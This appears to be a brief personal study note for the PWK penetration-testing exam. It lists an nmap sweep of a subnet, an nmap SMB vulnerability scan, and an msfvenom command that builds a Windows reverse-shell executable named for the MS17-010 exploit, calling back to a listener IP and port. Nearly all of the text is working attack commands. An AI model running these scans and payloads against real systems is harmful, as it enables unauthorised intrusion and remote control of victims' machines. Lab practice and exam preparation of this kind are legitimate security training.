# pwk2
prepare pwk 2 exam<br>
nmap <br>
sudo nmap -A -p80 --open 10.x.x.0/24 -oG nmap-scan_10.x.x.x-254

check smb vuln
nmap --script smb-vuln* -p 139,445 -Pn ip

ms17-010.exe is the payload which we generate with msfvenom:<br>
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
